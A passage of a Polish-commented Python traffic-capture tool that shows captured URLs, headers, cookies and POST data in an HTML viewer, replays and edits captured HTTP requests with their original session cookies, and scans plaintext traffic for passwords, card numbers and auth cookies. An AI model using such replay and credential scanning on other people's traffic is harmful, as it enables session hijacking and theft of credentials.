                print("2. Uruchom interaktywną przeglądarkę sesji")
                print("3. Odtwórz konkretne żądanie")
                print("4. Symuluj całą sesję przeglądania")
                print("0. Powrót do menu głównego")

                try:
                    choice = input("\nWybierz opcję: ").strip()
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                    continue

                if choice == "1":
                    if self.captured_data:
                        self.start_session_browser()
                    else:
                        print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
                elif choice == "2":
                    if self.captured_data:
                        self.start_interactive_session_browser()
                    else:
                        print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
                elif choice == "3":
                    if self.captured_data:
                        self.replay_specific_request()
                    else:
                        print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
                elif choice == "4":
                    if self.captured_data:
                        self.simulate_browsing_session()
                    else:
                        print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
                elif choice == "0":
                    break
                else:
                    print("Nieprawidłowy wybór. Wybierz opcję od 0 do 4.")

    def create_session_browser_app(self):
        """Tworzy aplikację do przeglądania sesji w formie interaktywnej przeglądarki - wersja z zabezpieczeniami"""
        if not self.captured_data or len(self.captured_data) == 0:
            print("Błąd: Brak danych do wyświetlenia.")
            return False

        try:
            # Sprawdź i napraw dane
            self.handle_session_data_errors()

            # Przygotuj dane dla przeglądarki
            browser_data = self.prepare_session_browser_data()
            if not browser_data:
                print("Nie udało się przygotować danych dla przeglądarki.")
                return False

            # Zapisz dane do pliku tymczasowego
            try:
                with open('temp_session_data.json', 'w', encoding='utf-8') as f:
                    import json
                    json.dump(browser_data, f, indent=2, default=str)
                print(f"Zapisano {len(browser_data)} URL w pliku tymczasowym.")
            except Exception as e:
                print(f"Błąd podczas zapisywania pliku tymczasowego: {e}")
                return False

            # Utwórz plik HTML dla przeglądarki sesji
            try:
                with open('session_browser_app.html', 'w', encoding='utf-8') as f:
                    f.write(self._get_session_browser_html())
                print(f"Utworzono plik HTML przeglądarki sesji.")
            except Exception as e:
                print(f"Błąd podczas tworzenia pliku HTML: {e}")
                # Usuń plik danych jeśli nie udało się utworzyć HTML
                try:
                    if os.path.exists('temp_session_data.json'):
                        os.remove('temp_session_data.json')
                except:
                    pass
                return False

            return True
        except Exception as e:
            print(f"Błąd podczas tworzenia aplikacji przeglądarki sesji: {e}")
            import traceback
            traceback.print_exc()

            # Spróbuj wyczyścić pliki tymczasowe w przypadku błędu
            try:
                for temp_file in ['temp_session_data.json', 'session_browser_app.html']:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
            except:
                pass

            return False

    def _get_session_browser_html(self):
        """Generuje kod HTML dla interaktywnej przeglądarki sesji"""
        return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Interaktywna przeglądarka sesji</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
            .container { display: flex; height: 100vh; }
            .sidebar { width: 300px; background: #f5f5f5; padding: 15px; overflow-y: auto; border-right: 1px solid #ddd; }
            .main-content { flex: 1; display: flex; flex-direction: column; }
            .url-bar { padding: 10px; background: #e0e0e0; border-bottom: 1px solid #ccc; display: flex; }
            .url-input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; }
            .browser-window { flex: 1; border: none; width: 100%; }
            .url-item { padding: 10px; cursor: pointer; border-bottom: 1px solid #eee; position: relative; }
            .url-item:hover { background-color: #e9e9e9; }
            .url-item.selected { background-color: #d7d7d7; }
            .request-count { position: absolute; right: 10px; top: 10px; background: #4CAF50; color: white; 
                             border-radius: 50%; width: 20px; height: 20px; text-align: center; line-height: 20px; font-size: 12px; }
            .navigation-buttons { display: flex; margin-right: 10px; }
            .nav-btn { padding: 8px 12px; background: #f0f0f0; border: 1px solid #ccc; border-radius: 4px; 
                      margin-right: 5px; cursor: pointer; }
            .nav-btn:hover { background: #e0e0e0; }
            .nav-btn:disabled { opacity: 0.5; cursor: not-allowed; }
            .protocol-badge { display: inline-block; padding: 2px 5px; border-radius: 3px; margin-right: 5px; 
                             font-size: 11px; font-weight: bold; }
            .http-badge { background: #4CAF50; color: white; }
            .https-badge { background: #2196F3; color: white; }
            .tab-buttons { display: flex; background: #e0e0e0; border-bottom: 1px solid #ccc; }
            .tab-btn { padding: 10px 15px; cursor: pointer; border: none; background: none; outline: none; }
            .tab-btn.active { background: #fff; border-bottom: 2px solid #4CAF50; }
            .tab-content { padding: 15px; overflow-y: auto; max-height: 300px; display: none; }
            .tab-content.active { display: block; }
            .detail-section { margin-bottom: 15px; }
            .detail-section h3 { margin-top: 0; }
            .cookie-table, .header-table { width: 100%; border-collapse: collapse; margin-bottom: 15px; }
            .cookie-table th, .cookie-table td, .header-table th, .header-table td { 
                padding: 8px; border: 1px solid #ddd; text-align: left; 
            }
            .cookie-table th, .header-table th { background: #f2f2f2; }
            .btn-replay { background: #4CAF50; color: white; border: none; padding: 8px 15px; border-radius: 4px; 
                          cursor: pointer; display: block; margin-top: 10px; }
            .btn-replay:hover { background: #45a049; }
            .pagination { display: flex; justify-content: center; padding: 10px; background: #f5f5f5; }
            .page-btn { padding: 5px 10px; margin: 0 5px; cursor: pointer; border: 1px solid #ccc; border-radius: 3px; }
            .page-btn.active { background: #4CAF50; color: white; }
            .search-bar { padding: 10px; background: #f0f0f0; border-bottom: 1px solid #ddd; }
            .search-input { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
            .browser-history { max-height: calc(100vh - 300px); overflow-y: auto; }
            .history-item { padding: 8px; cursor: pointer; border-bottom: 1px solid #eee; }
            .history-item:hover { background: #f0f0f0; }
            .session-info { padding: 10px; background: #f8f8f8; border-bottom: 1px solid #ddd; font-size: 12px; }
            .loading-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(255,255,255,0.8);
                              display: flex; justify-content: center; align-items: center; z-index: 1000; }
            .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px;
                      height: 30px; animation: spin 2s linear infinite; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="sidebar">
                <div class="session-info">
                    <div id="sessionStats"></div>
                </div>
                <div class="search-bar">
                    <input type="text" class="search-input" id="searchUrl" placeholder="Szukaj URL...">
                </div>
                <div id="urlList"></div>
            </div>
            <div class="main-content">
                <div class="url-bar">
                    <div class="navigation-buttons">
                        <button class="nav-btn" id="backBtn" disabled>&lt;</button>
                        <button class="nav-btn" id="forwardBtn" disabled>&gt;</button>
                        <button class="nav-btn" id="refreshBtn">↻</button>
                    </div>
                    <input type="text" class="url-input" id="urlInput" placeholder="URL" readonly>
                </div>
                <div class="tab-buttons">
                    <button class="tab-btn active" data-tab="browserTab">Przeglądarka</button>
                    <button class="tab-btn" data-tab="requestsTab">Szczegóły żądań</button>
                    <button class="tab-btn" data-tab="cookiesTab">Ciasteczka</button>
                    <button class="tab-btn" data-tab="historyTab">Historia</button>
                </div>
                <div class="tab-content active" id="browserTab">
                    <iframe id="browserFrame" class="browser-window"></iframe>
                </div>
                <div class="tab-content" id="requestsTab">
                    <div id="requestDetails">
                        <div class="pagination" id="requestPagination"></div>
                        <div id="requestContent"></div>
                    </div>
                </div>
                <div class="tab-content" id="cookiesTab">
                    <div id="cookieDetails"></div>
                </div>
                <div class="tab-content" id="historyTab">
                    <div class="browser-history" id="browserHistory"></div>
                </div>
            </div>
        </div>

        <script>
            // Główne zmienne
            let sessionData = {};
            let currentUrl = null;
            let browserHistory = [];
            let historyPosition = -1;
            let currentRequestIndex = 0;
            let currentRequests = [];

            // Stan aplikacji
            const appState = {
                selectedUrl: null,
                filteredUrls: [],
                allUrls: [],
                browsedPages: new Set(),
                cookies: {},
                history: []
            };

            // Funkcja inicjalizująca
            async function init() {
                try {
                    // Pobierz dane sesji
                    const response = await fetch('/data');
                    sessionData = await response.json();

                    // Inicjalizacja listy URL
                    appState.allUrls = Object.keys(sessionData);
                    appState.filteredUrls = [...appState.allUrls];

                    // Wyświetl statystyki
                    displaySessionStats();

                    // Wyświetl listę URL
                    renderUrlList();

                    // Dodaj nasłuchiwanie zdarzeń
                    setupEventListeners();
                } catch (error) {
                    console.error('Błąd podczas inicjalizacji:', error);
                    alert('Wystąpił błąd podczas ładowania danych sesji.');
                }
            }

            // Funkcja wyświetlająca statystyki sesji
            function displaySessionStats() {
                const urlCount = appState.allUrls.length;
                let requestCount = 0;
                let uniqueDomains = new Set();

                appState.allUrls.forEach(url => {
                    requestCount += sessionData[url].length;

                    try {
                        let domain = new URL(url).hostname;
                        uniqueDomains.add(domain);
                    } catch (e) {
                        // Obsługa nieprawidłowych URL
                        if (url.includes('://')) {
                            const parts = url.split('://')[1].split('/')[0];
                            uniqueDomains.add(parts);
                        }
                    }
                });

                document.getElementById('sessionStats').innerHTML = `
                    <div><strong>URL:</strong> ${urlCount}</div>
                    <div><strong>Domeny:</strong> ${uniqueDomains.size}</div>
                    <div><strong>Żądania:</strong> ${requestCount}</div>
                `;
            }

            // Funkcja renderująca listę URL
            function renderUrlList() {
                const urlListElement = document.getElementById('urlList');
                urlListElement.innerHTML = '';

                appState.filteredUrls.forEach(url => {
                    const urlItem = document.createElement('div');
                    urlItem.className = 'url-item';
                    if (appState.selectedUrl === url) {
                        urlItem.classList.add('selected');
                    }

                    // Określ protokół
                    const isHttps = url.startsWith('https://');
                    const protocol = isHttps ? 'HTTPS' : 'HTTP';
                    const protocolClass = isHttps ? 'https-badge' : 'http-badge';

                    // Skróć URL do wyświetlenia
                    let displayUrl = url;
                    if (url.length > 40) {
                        const urlObj = new URL(url);
                        displayUrl = urlObj.hostname + urlObj.pathname.substring(0, 20) + '...';
                    }

                    urlItem.innerHTML = `
                        <span class="protocol-badge ${protocolClass}">${protocol}</span>
                        ${displayUrl}
                        <span class="request-count">${sessionData[url].length}</span>
                    `;

                    urlItem.addEventListener('click', () => {
                        selectUrl(url);
                    });

                    urlListElement.appendChild(urlItem);
                });
            }

            // Funkcja wybierająca URL
            function selectUrl(url) {
                appState.selectedUrl = url;
                currentUrl = url;
                currentRequests = sessionData[url];
                currentRequestIndex = 0;

                // Aktualizuj historię przeglądarki
                if (historyPosition === browserHistory.length - 1) {
                    browserHistory.push(url);
                    historyPosition++;
                } else {
                    browserHistory = browserHistory.slice(0, historyPosition + 1);
                    browserHistory.push(url);
                    historyPosition = browserHistory.length - 1;
                }

                // Aktualizuj listę URL
                renderUrlList();

                // Aktualizuj pasek URL
                document.getElementById('urlInput').value = url;

                // Aktualizuj przyciski nawigacji
                updateNavigationButtons();

                // Załaduj stronę do przeglądarki
                loadPageInBrowser(url);

                // Wyświetl szczegóły żądań
                renderRequestDetails();

                // Wyświetl ciasteczka
                renderCookieDetails();

                // Dodaj do historii przeglądania
                addToHistory(url);
            }

            // Funkcja ładująca stronę do przeglądarki
            function loadPageInBrowser(url) {
                const iframe = document.getElementById('browserFrame');

                // Utwórz symulowaną zawartość strony
                const pageContent = generatePageContent(url, currentRequests);

                // Ustaw zawartość iframe
                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
                iframeDocument.open();
                iframeDocument.write(pageContent);
                iframeDocument.close();

                // Dodaj do odwiedzonych stron
                appState.browsedPages.add(url);
            }

            // Funkcja generująca zawartość strony
            function generatePageContent(url, requests) {
                // Dla HTTPS stron, wyświetl informację o braku możliwości wyświetlenia
                if (url.startsWith('https://')) {
                    return `
                        <html>
                        <head>
                            <style>
                                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; text-align: center; }
                                .https-info { max-width: 600px; margin: 50px auto; padding: 20px; 
                                            border: 1px solid #ccc; border-radius: 5px; background: #f9f9f9; }
                                h2 { color: #2196F3; }
                                .lock-icon { font-size: 48px; color: #2196F3; margin-bottom: 20px; }
                            </style>
                        </head>
                        <body>
                            <div class="https-info">
                                <div class="lock-icon">🔒</div>
                                <h2>Połączenie HTTPS</h2>
                                <p>Ta strona używa szyfrowanego połączenia HTTPS. Nie jest możliwe wyświetlenie jej rzeczywistej zawartości 
                                   w przeglądarce sesji, ponieważ dane zostały zaszyfrowane.</p>
                                <p>Możesz zobaczyć szczegóły żądań i ciasteczka w odpowiednich zakładkach.</p>
                                <hr>
                                <p><strong>URL:</strong> ${url}</p>
                                <p><strong>Liczba zarejestrowanych żądań:</strong> ${requests.length}</p>
                            </div>
                        </body>
                        </html>
                    `;
                }

                // Dla stron HTTP, spróbuj odtworzyć zawartość na podstawie zebranych danych
                // To jest bardzo uproszczona symulacja zawartości - w rzeczywistości potrzebny byłby bardziej zaawansowany mechanizm
                let htmlContent = `
                    <html>
                    <head>
                        <style>
                            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                            .page-header { background: #f5f5f5; padding: 15px; border-bottom: 1px solid #ddd; }
                            .content-section { margin: 20px 0; }
                            .request-item { margin-bottom: 10px; padding: 10px; border: 1px solid #eee; }
                        </style>
                    </head>
                    <body>
                        <div class="page-header">
                            <h2>Symulacja strony: ${url}</h2>
                            <p>Ta strona jest symulacją na podstawie przechwyconych danych.</p>
                        </div>
                        <div class="content-section">
                            <h3>Zarejestrowane żądania dla tej strony:</h3>
                `;

                requests.forEach((req, index) => {
                    htmlContent += `
                        <div class="request-item">
                            <strong>Żądanie #${index + 1}</strong> (${req.timestamp})<br>
                            Metoda: ${req.method}<br>
                            Protokół: ${req.protocol || 'HTTP'}<br>
                    `;

                    if (req.post_data) {
                        htmlContent += `<p>Dane POST: ${req.post_data}</p>`;
                    }

                    htmlContent += `</div>`;
                });

                htmlContent += `
                        </div>
                    </body>
                    </html>
                `;

                return htmlContent;
            }

            // Funkcja renderująca szczegóły żądań
            function renderRequestDetails() {
                if (!currentUrl || !currentRequests || currentRequests.length === 0) {
                    return;
                }

                // Renderuj paginację
                const paginationElement = document.getElementById('requestPagination');
                paginationElement.innerHTML = '';

                for (let i = 0; i < currentRequests.length; i++) {
                    const pageBtn = document.createElement('div');
                    pageBtn.className = 'page-btn';
                    if (i === currentRequestIndex) {
                        pageBtn.classList.add('active');
                    }
                    pageBtn.textContent = i + 1;
                    pageBtn.addEventListener('click', () => {
                        currentRequestIndex = i;
                        renderRequestDetails();
                    });
                    paginationElement.appendChild(pageBtn);
                }

                // Renderuj szczegóły wybranego żądania
                const requestContentElement = document.getElementById('requestContent');
                const request = currentRequests[currentRequestIndex];

                let requestHtml = `
                    <div class="detail-section">
                        <h3>Żądanie #${currentRequestIndex + 1}</h3>
                        <p><strong>Czas:</strong> ${request.timestamp}</p>
                        <p><strong>Metoda:</strong> ${request.method}</p>
                        <p><strong>Protokół:</strong> ${request.protocol || 'HTTP'}</p>

                        <h4>Nagłówki:</h4>
                        <table class="header-table">
                            <tr>
                                <th>Nagłówek</th>
                                <th>Wartość</th>
                            </tr>
                `;

                // Dodaj nagłówki
                for (const [header, value] of Object.entries(request.headers || {})) {
                    requestHtml += `
                        <tr>
                            <td>${header}</td>
                            <td>${value}</td>
                        </tr>
                    `;
                }

                requestHtml += `</table>`;

                // Dodaj dane POST
                if (request.post_data) {
                    requestHtml += `
                        <h4>Dane POST:</h4>
                        <pre>${request.post_data}</pre>
                    `;
                }

                // Dodaj przycisk do odtworzenia żądania
                requestHtml += `
                    <button class="btn-replay" onclick="replayRequest('${currentUrl}', ${currentRequestIndex})">
                        Odtwórz to żądanie
                    </button>
                </div>
                `;

                requestContentElement.innerHTML = requestHtml;
            }

            // Funkcja renderująca szczegóły ciasteczek
            function renderCookieDetails() {
                const cookieDetailsElement = document.getElementById('cookieDetails');

                if (!currentUrl || !currentRequests || currentRequests.length === 0) {
                    cookieDetailsElement.innerHTML = '<p>Brak danych o ciasteczkach.</p>';
                    return;
                }

                // Zbierz wszystkie ciasteczka z żądań
                const allCookies = {};
                currentRequests.forEach(req => {
                    if (req.cookies && Object.keys(req.cookies).length > 0) {
                        for (const [name, value] of Object.entries(req.cookies)) {
                            allCookies[name] = value;
                        }
                    }
                });

                if (Object.keys(allCookies).length === 0) {
                    cookieDetailsElement.innerHTML = '<p>Brak ciasteczek dla tej strony.</p>';
                    return;
                }

                let cookieHtml = `
                    <h3>Ciasteczka dla ${currentUrl}</h3>
                    <table class="cookie-table">
                        <tr>
                            <th>Nazwa</th>
                            <th>Wartość</th>
                        </tr>
                `;

                for (const [name, value] of Object.entries(allCookies)) {
                    cookieHtml += `
                        <tr>
                            <td>${name}</td>
                            <td>${value}</td>
                        </tr>
                    `;
                }

                cookieHtml += `</table>`;
                cookieDetailsElement.innerHTML = cookieHtml;
            }

            // Funkcja dodająca URL do historii
            function addToHistory(url) {
                const historyElement = document.getElementById('browserHistory');

                // Sprawdź czy URL już istnieje w historii
                if (!appState.history.includes(url)) {
                    appState.history.unshift(url);

                    // Ogranicz historię do 50 elementów
                    if (appState.history.length > 50) {
                        appState.history.pop();
                    }

                    // Renderuj historię
                    renderHistory();
                }
            }

            // Funkcja renderująca historię
            function renderHistory() {
                const historyElement = document.getElementById('browserHistory');
                historyElement.innerHTML = '';

                appState.history.forEach(url => {
                    const historyItem = document.createElement('div');
                    historyItem.className = 'history-item';

                    // Określ protokół
                    const isHttps = url.startsWith('https://');
                    const protocol = isHttps ? 'HTTPS' : 'HTTP';
                    const protocolClass = isHttps ? 'https-badge' : 'http-badge';

                    // Skróć URL do wyświetlenia
                    let displayUrl = url;
                    if (url.length > 40) {
                        try {
                            const urlObj = new URL(url);
                            displayUrl = urlObj.hostname + urlObj.pathname.substring(0, 20) + '...';
                        } catch (e) {
                            displayUrl = url.substring(0, 40) + '...';
                        }
                    }

                    historyItem.innerHTML = `
                        <span class="protocol-badge ${protocolClass}">${protocol}</span>
                        ${displayUrl}
                    `;

                    historyItem.addEventListener('click', () => {
                        selectUrl(url);
                    });

                    historyElement.appendChild(historyItem);
                });
            }

            // Funkcja aktualizująca przyciski nawigacji
            function updateNavigationButtons() {
                const backBtn = document.getElementById('backBtn');
                const forwardBtn = document.getElementById('forwardBtn');

                backBtn.disabled = historyPosition <= 0;
                forwardBtn.disabled = historyPosition >= browserHistory.length - 1;
            }

            // Funkcja do odtwarzania żądania
            function replayRequest(url, requestIndex) {
                const request = sessionData[url][requestIndex];

                alert(`Symulowanie odtworzenia żądania: ${request.method} ${url}`);

                // W pełnej implementacji tutaj wysyłałoby się żądanie do serwera proxy,
                // który odtwarzałby oryginalne żądanie i przekazywał odpowiedź
            }

            // Funkcja ustawiająca nasłuchiwanie zdarzeń
            function setupEventListeners() {
                // Obsługa nawigacji
                document.getElementById('backBtn').addEventListener('click', () => {
                    if (historyPosition > 0) {
                        historyPosition--;
                        selectUrl(browserHistory[historyPosition]);
                    }
                });

                document.getElementById('forwardBtn').addEventListener('click', () => {
                    if (historyPosition < browserHistory.length - 1) {
                        historyPosition++;
                        selectUrl(browserHistory[historyPosition]);
                    }
                });

                document.getElementById('refreshBtn').addEventListener('click', () => {
                    if (currentUrl) {
                        loadPageInBrowser(currentUrl);
                    }
                });

                // Obsługa zakładek
                document.querySelectorAll('.tab-btn').forEach(btn => {
                    btn.addEventListener('click', () => {
                        // Usuń aktywną klasę ze wszystkich zakładek
                        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

                        // Dodaj aktywną klasę do wybranej zakładki
                        btn.classList.add('active');
                        const tabId = btn.getAttribute('data-tab');
                        document.getElementById(tabId).classList.add('active');
                    });
                });

                // Obsługa wyszukiwania
                document.getElementById('searchUrl').addEventListener('input', event => {
                    const searchTerm = event.target.value.toLowerCase();

                    if (searchTerm === '') {
                        appState.filteredUrls = [...appState.allUrls];
                    } else {
                        appState.filteredUrls = appState.allUrls.filter(url => 
                            url.toLowerCase().includes(searchTerm)
                        );
                    }

                    renderUrlList();
                });
            }

            // Inicjalizacja aplikacji
            document.addEventListener('DOMContentLoaded', init);
        </script>
    </body>
    </html>
    '''

    def replay_request(self, url, request_data):
        """Odtwarza zapisane żądanie HTTP

        Args:
            url (str): Adres URL do którego ma być wysłane żądanie
            request_data (dict): Dane żądania zawierające metodę, nagłówki, ciasteczka itp.

        Returns:
            dict: Odpowiedź zawierająca status, nagłówki i treść
        """
        try:
            print(f"Odtwarzanie żądania {request_data['method']} do {url}")

            # Sprawdź czy URL jest HTTPS
            if url.startswith("https://"):
                return {
                    "status": 400,
                    "headers": {},
                    "content": "Nie można odtworzyć żądań HTTPS ze względu na szyfrowanie połączenia."
                }

            # Przygotuj sesję HTTP
            import requests
            session = requests.Session()

            # Dodaj ciasteczka
            if request_data.get('cookies'):
                for name, value in request_data['cookies'].items():
                    session.cookies.set(name, value)

            # Przygotuj nagłówki
            headers = {}
            if request_data.get('headers'):
                headers = request_data['headers']

                # Usuń nagłówki, które mogą powodować problemy
                problematic_headers = ['Content-Length', 'Host', 'Connection', 'Accept-Encoding']
                for header in problematic_headers:
                    if header in headers:
                        del headers[header]

            # Przygotuj dane POST
            data = None
            if request_data.get('method') == 'POST' and request_data.get('post_data'):
                data = request_data['post_data']

            # Wykonaj żądanie
            method = request_data.get('method', 'GET')

            if method == 'GET':
                response = session.get(url, headers=headers, allow_redirects=False)
            elif method == 'POST':
                response = session.post(url, headers=headers, data=data, allow_redirects=False)
            else:
                return {
                    "status": 400,
                    "headers": {},
                    "content": f"Nieobsługiwana metoda HTTP: {method}"
                }

            # Przygotuj odpowiedź
            response_headers = dict(response.headers)

            return {
                "status": response.status_code,
                "headers": response_headers,
                "content": response.text
            }

        except Exception as e:
            import traceback
            traceback.print_exc()

            return {
                "status": 500,
                "headers": {},
                "content": f"Błąd podczas odtwarzania żądania: {str(e)}"
            }

    def modify_request_data(self, request_data, modifications):
        """Modyfikuje dane żądania HTTP przed ich odtworzeniem

        Args:
            request_data (dict): Oryginalne dane żądania
            modifications (dict): Modyfikacje do zastosowania (nagłówki, ciasteczka itp.)

        Returns:
            dict: Zmodyfikowane dane żądania
        """
        # Utwórz kopię danych żądania
        modified_data = dict(request_data)

        # Modyfikuj nagłówki
        if 'headers' in modifications:
            if 'headers' not in modified_data:
                modified_data['headers'] = {}

            for header, value in modifications['headers'].items():
                if value is None:  # Usuń nagłówek
                    if header in modified_data['headers']:
                        del modified_data['headers'][header]
                else:  # Dodaj lub zmień nagłówek
                    modified_data['headers'][header] = value

        # Modyfikuj ciasteczka
        if 'cookies' in modifications:
            if 'cookies' not in modified_data:
                modified_data['cookies'] = {}

            for cookie, value in modifications['cookies'].items():
                if value is None:  # Usuń ciasteczko
                    if cookie in modified_data['cookies']:
                        del modified_data['cookies'][cookie]
                else:  # Dodaj lub zmień ciasteczko
                    modified_data['cookies'][cookie] = value

        # Modyfikuj metodę HTTP
        if 'method' in modifications:
            modified_data['method'] = modifications['method']

        # Modyfikuj dane POST
        if 'post_data' in modifications:
            modified_data['post_data'] = modifications['post_data']

        return modified_data

    def merge_sessions(self, filenames):
        """Łączy dane przechwycone z wielu plików sesji

        Args:
            filenames (list): Lista ścieżek do plików z zapisanymi sesjami

        Returns:
            bool: True jeśli łączenie przebiegło pomyślnie, False w przeciwnym wypadku
        """
        if not filenames:
            print("Brak plików do scalenia.")
            return False

        # Zachowaj kopię oryginalnych danych
        original_data = self.captured_data.copy() if self.captured_data else {}
        merged_data = {}

        try:
            # Przetwórz każdy plik
            for filename in filenames:
                if not os.path.isfile(filename):
                    print(f"Plik {filename} nie istnieje, pomijam.")
                    continue

                print(f"Wczytywanie danych z pliku: {filename}")

                try:
                    with open(filename, 'rb') as f:
                        file_data = pickle.load(f)

                    if not isinstance(file_data, dict):
                        print(f"Nieprawidłowy format danych w pliku {filename}, pomijam.")
                        continue

                    # Dodaj dane do połączonych danych
                    for url, requests in file_data.items():
                        if url in merged_data:
                            # Dodaj tylko unikalne żądania (sprawdzanie po timestamp)
                            existing_timestamps = {req.get('timestamp') for req in merged_data[url]}
                            for req in requests:
                                if req.get('timestamp') not in existing_timestamps:
                                    merged_data[url].append(req)
                                    existing_timestamps.add(req.get('timestamp'))
                        else:
                            merged_data[url] = requests

                    print(f"Pomyślnie dodano dane z pliku {filename}")
                except Exception as e:
                    print(f"Błąd podczas wczytywania pliku {filename}: {e}")
                    continue

            # Jeśli mamy oryginalne dane, dodajmy je do scalonych danych
            if original_data:
                for url, requests in original_data.items():
                    if url in merged_data:
                        # Dodaj tylko unikalne żądania
                        existing_timestamps = {req.get('timestamp') for req in merged_data[url]}
                        for req in requests:
                            if req.get('timestamp') not in existing_timestamps:
                                merged_data[url].append(req)
                                existing_timestamps.add(req.get('timestamp'))
                    else:
                        merged_data[url] = requests

            # Sprawdź czy udało się scalić jakieś dane
            if not merged_data:
                print("Nie udało się scalić żadnych danych.")
                return False

            # Przypisz scalone dane
            self.captured_data = merged_data

            # Wyświetl statystyki
            url_count = len(self.captured_data)
            request_count = sum(len(requests) for requests in self.captured_data.values())

            print(f"\nStatystyki scalonych danych:")
            print(f"- Liczba unikalnych URL: {url_count}")
            print(f"- Łączna liczba żądań: {request_count}")

            print("\nNajczęściej odwiedzane URL:")
            urls_by_requests = sorted(
                [(url, len(reqs)) for url, reqs in self.captured_data.items()],
                key=lambda x: x[1],
                reverse=True
            )

            for i, (url, count) in enumerate(urls_by_requests[:10]):
                print(f"  {i + 1}. {url} - {count} żądań")

            return True

        except Exception as e:
            print(f"Błąd podczas scalania sesji: {e}")
            import traceback
            traceback.print_exc()

            # Przywróć oryginalne dane w przypadku błędu
            self.captured_data = original_data
            return False

    def analyze_traffic(self):
        """Analizuje przechwycony ruch sieciowy pod kątem wzorców i potencjalnych problemów bezpieczeństwa

        Returns:
            dict: Wyniki analizy zawierające różne metryki i wykryte problemy
        """
        if not self.captured_data:
            print("Brak danych do analizy.")
            return None

        try:
            results = {
                "stats": {},
                "security_issues": [],
                "performance_issues": [],
                "interesting_patterns": []
            }

            # --- Statystyki podstawowe ---
            url_count = len(self.captured_data)
            request_count = sum(len(requests) for requests in self.captured_data.values())
            http_count = sum(len([r for r in reqs if r.get('protocol') == 'HTTP' or not r.get('protocol')])
                             for reqs in self.captured_data.values())
            https_count = sum(len([r for r in reqs if r.get('protocol') == 'HTTPS'])
                              for reqs in self.captured_data.values())

            # Oblicz domeny
            domains = set()
            for url in self.captured_data.keys():
                try:
                    if '://' in url:
                        domain = url.split('://', 1)[1].split('/', 1)[0]
                        domains.add(domain)
                except:
                    pass

            results["stats"] = {
                "url_count": url_count,
                "request_count": request_count,
                "http_count": http_count,
                "https_count": https_count,
                "domain_count": len(domains),
                "domains": list(domains)
            }

            # --- Analiza bezpieczeństwa ---

            # Wykrywanie niezaszyfrowanych HTTP
            http_urls = [url for url in self.captured_data.keys() if url.startswith('http://')]
            if http_urls:
                results["security_issues"].append({
                    "type": "unencrypted_traffic",
                    "description": "Wykryto niezaszyfrowany ruch HTTP",
                    "count": len(http_urls),
                    "urls": http_urls[:5]  # Pokaż maksymalnie 5 przykładów
                })

            # Wykrywanie niezaszyfrowanych danych osobowych
            sensitive_keywords = [
                'password', 'hasło', 'haslo', 'pass', 'pwd', 'passwd',
                'email', 'login', 'username', 'użytkownik', 'uzytkownik',
                'pesel', 'credit', 'card', 'karta', 'cvv', 'cvc'
            ]

            unsecured_sensitive_data = []
            for url, requests in self.captured_data.items():
                if not url.startswith('https://'):
                    for req in requests:
                        if req.get('post_data'):
                            post_data = req.get('post_data').lower()
                            for keyword in sensitive_keywords:
                                if keyword in post_data:
                                    unsecured_sensitive_data.append({
                                        "url": url,
                                        "keyword": keyword,
                                        "timestamp": req.get('timestamp', 'unknown')
                                    })
                                    break

            if unsecured_sensitive_data:
                results["security_issues"].append({
                    "type": "unsecured_sensitive_data",
                    "description": "Wykryto niezaszyfrowane dane wrażliwe",
                    "count": len(unsecured_sensitive_data),
                    "examples": unsecured_sensitive_data[:5]  # Pokaż maksymalnie 5 przykładów
                })

            # Wykrywanie podejrzanych ciasteczek bez flagi Secure
            unsecured_cookies = []
            for url, requests in self.captured_data.items():
                for req in requests:
                    cookies = req.get('cookies', {})
                    for cookie_name, cookie_value in cookies.items():
                        # Sprawdź czy ciasteczko zawiera potencjalnie wrażliwe informacje
                        if any(keyword in cookie_name.lower() for keyword in ['sess', 'auth', 'token', 'login', 'id']):
                            if not url.startswith('https://'):
                                unsecured_cookies.append({
                                    "url": url,
                                    "cookie_name": cookie_name,
                                    "timestamp": req.get('timestamp', 'unknown')
                                })

            if unsecured_cookies:
                results["security_issues"].append({
                    "type": "unsecured_cookies",
                    "description": "Wykryto niezabezpieczone ciasteczka sesyjne/autoryzacyjne",
                    "count": len(unsecured_cookies),
                    "examples": unsecured_cookies[:5]  # Pokaż maksymalnie 5 przykładów
                })

            # --- Analiza wydajności ---

            # Znajdź strony z dużą liczbą żądań
            high_request_urls = []
            for url, requests in self.captured_data.items():
                if len(requests) > 20:  # Próg dla zbyt wielu żądań
                    high_request_urls.append({
                        "url": url,
                        "request_count": len(requests)
                    })

            if high_request_urls:
                results["performance_issues"].append({
                    "type": "high_request_count",
                    "description": "Wykryto strony z dużą liczbą żądań",
                    "count": len(high_request_urls),
                    "examples": sorted(high_request_urls, key=lambda x: x["request_count"], reverse=True)[:5]
                })

            # --- Analiza wzorców ---

            # Wykrywanie powtarzających się żądań do tych samych zasobów
            repeated_requests = {}
            for url, requests in self.captured_data.items():
                # Grupuj żądania według metody i ścieżki
                request_groups = {}
                for req in requests:
                    method = req.get('method', 'GET')
                    key = f"{method} {url}"
                    if key not in request_groups:
                        request_groups[key] = []
                    request_groups[key].append(req)

                # Sprawdź grupy z wieloma żądaniami
